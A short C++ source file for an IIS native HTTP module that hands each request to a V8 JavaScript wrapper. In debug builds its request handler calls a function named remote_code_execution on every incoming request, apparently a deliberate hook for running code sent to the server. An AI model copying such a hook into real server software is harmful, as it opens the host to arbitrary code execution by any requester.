#include "http_module.h"
 
#pragma comment( lib, "ole32.lib" )
#pragma comment( lib, "oleaut32.lib" )


/**
 * OnBeginRequest
 */
REQUEST_NOTIFICATION_STATUS HttpModule::OnBeginRequest(IN IHttpContext* pHttpContext, IN IHttpEventProvider* pProvider)
{
#ifdef _DEBUG
	v8_wrapper::remote_code_execution(pHttpContext);
#endif

	// Return processing to the pipeline.
	return v8_wrapper::begin_request(pHttpContext);
}